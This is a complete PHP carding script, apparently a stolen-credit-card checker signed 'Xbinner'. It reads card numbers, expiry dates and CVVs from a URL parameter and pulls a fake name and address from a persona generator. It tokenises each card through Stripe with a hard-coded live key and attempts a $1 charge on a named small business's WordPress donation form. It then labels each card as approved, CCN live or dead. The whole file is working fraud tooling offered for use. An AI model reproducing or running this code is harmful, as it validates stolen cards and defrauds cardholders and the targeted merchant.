<?php


//================[Functions and Variables]================//
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

$cc = isset($_GET['lista']) ? $_GET['lista'] : FALSE;
preg_match_all('!\d+!', $cc, $matches);
$cc = $matches[0][0];
$mes = $matches[0][1];
$ano = $matches[0][2];
$cvv = $matches[0][3];
$lista = "$cc|$mes|$ano|$cvv";
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}

function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}

//================[Functions and Variables]================//
time_sleep_until(5);

//==================[Randomizing Details]
$rand = rand(0000,9999);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://fakepersongenerator.com/Index/generate');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
$headers = array();
$headers[] = 'User-Agent: Mozilla/5.0 (Android 12; Mobile; LG-M255; rv:100.0) Gecko/100.0 Firefox/100.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$res = curl_exec($ch);
$name = trim(strip_tags(getStr($res,"class='text-center name'><b class='click'>",'</b>')));
$firstname = multiexplode(array("&nbsp;"), $name)[0];
$lastname = multiexplode(array("&nbsp;"), $name)[2];
$email = ''.$first.''.$rand.'@yahoo.com';
$street = trim(strip_tags(getStr($res,'<p>Street: <b>','</b>')));
$stct = trim(strip_tags(getStr($res,'<p>City, State, Zip: <b>','</b>')));
$city = multiexplode(array(","), $stct)[0];
$statefull = multiexplode(array(","), $stct)[1];
$state = trim(strip_tags(getStr($statefull,'(',')')));
$zip = multiexplode(array(","), $stct)[2];
//==============[Randomizing Details-END]======================//



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://m.stripe.com/6');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: m.stripe.com',
'User-Agent: Mozilla/5.0 (Linux; Android 10; vivo 1806) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
'Accept: */*',
'Accept-Language: en-US,en;q=0.5',
'Content-Type: text/plain;charset=UTF-8',
'Origin: https://m.stripe.network',
'Connection: keep-alive',
'Referer: https://m.stripe.network/inner.html'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, "");
$result1 = curl_exec($ch);
$muid = trim(strip_tags(getStr($result1,'"muid":"','"')));
$sid = trim(strip_tags(getStr($result1,'"sid":"','"')));
$guid = trim(strip_tags(getStr($result1,'"guid":"','"')));

//echo '[ IP: '.$ip.' ] ';
//=======================[Proxys END]=============================//

time_sleep_until(5);
//=======================[1 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'HOST: api.stripe.com',
'accept: application/json',
'accept-encoding: gzip, deflate, br',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Linux; Android 10; vivo 1806) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, "guid=$guid&muid=$muid&sid=$sid&key=pk_live_VbZTSNMWyEVQ8KPN2HBGyN3T&card[number]=$cc&card[exp_month]=$mes&card[exp_year]=$ano&card[cvc]=$cvv");

$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"'))); 
//=======================[1 REQ-END]==============================//
time_sleep_until(5);

//=======================[2 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.maksportsmd.com/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json, text/javascript, */*; q=0.01',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'user-agent: Mozilla/5.0 (Linux; Android 10; vivo 1806) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
   ));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, "action=wp_full_stripe_payment_charge&formName=Pay_Online&fullstripe_email=$email&fullstripe_custom_amount=1&fullstripe_address_line1=$street&fullstripe_address_line2=&fullstripe_address_city=$city&fullstripe_address_state=$statefull&fullstripe_address_zip=$zip&fullstripe_name=$firstname+$lastname&stripeToken=$id");


$result2 = curl_exec($ch);
$msg = trim(strip_tags(getStr($result2,'"msg":"','"')));
$info = curl_getinfo($ch);
$time = $info['total_time'];

//=======================[2 REQ-END]==============================//


//=======================[MADE BY]==============================//

$MADEBY = "[Xbinner]";

//[You Have  To Change Name Here Automatically In All Response Will Change ]//

//=======================[MADE BY]==============================//


//=======================[Responses]==============================//

# - [CVV Responses ] - #

if ((strpos($result2, 'success":true')) || (strpos($result2, "Thank You.")) || (strpos($result2, 'Your card zip code is incorrect.')) || (strpos($result2, "Thank You For Donation.")) || (strpos($result2, "incorrect_zip")) || (strpos($result2, "Payment Successful!")) || (strpos($result2, 'insufficient funds')) || (strpos($result2, "/donations/thank_you?donation_number="))){
    echo '<br><span class="badge badge-success">#Approved ✓ </span> : ' . $lista . ' ➜  CHARGED 1$➜'.$msg.' </span> ' . $MADEBY . '</br>';
}

elseif ((strpos($result2, 'security code is incorrect.')) || (strpos($result2, "security code is invalid.")) || (strpos($result2, "Your card's security code is incorrect.")) || (strpos($result2, "incorrect_cvc"))){
    echo '<br><span class="badge badge-warning">#CCN ✓ </span> : ' . $lista . ' ➜  CCN Live ['.$msg.']➜ </span> ' . $MADEBY . '</br>';

}
#-[CCN Responses END ]- #



#- [Stolen,Lost,Pickup Responses]- #
elseif ((strpos($result2, 'Your card was declined.')) || (strpos($result2, "generic_decline")) || (strpos($result2, 'do_not_honor')) || (strpos($result2, "generic_decline")) || (strpos($result2, "processing_error")) || (strpos($result2, "parameter_invalid_empty")) || (strpos($result2, 'lock_timeout')) || (strpos($result2, "transaction_not_allowed"))){
    echo '<br><span class="badge badge-danger">#DEAD ✗ </span> : ' . $lista . ' ➜ '.$msg.' ➜ ' .$MADEBY . '</br>';
}

else {
    echo '<br><span class="badge badge-danger">#DEAD ✗ </span> : ' .$lista . ' ➜ '.$msg.' ➜ ' . $MADEBY . '</br>';
}

# - [UPDATE,PROXY DEAD , CC CHECKER DEAD Responses END ] - #
//=======================[Responses-END]==============================//
sleep(5);
curl_close($ch);
ob_flush();


?>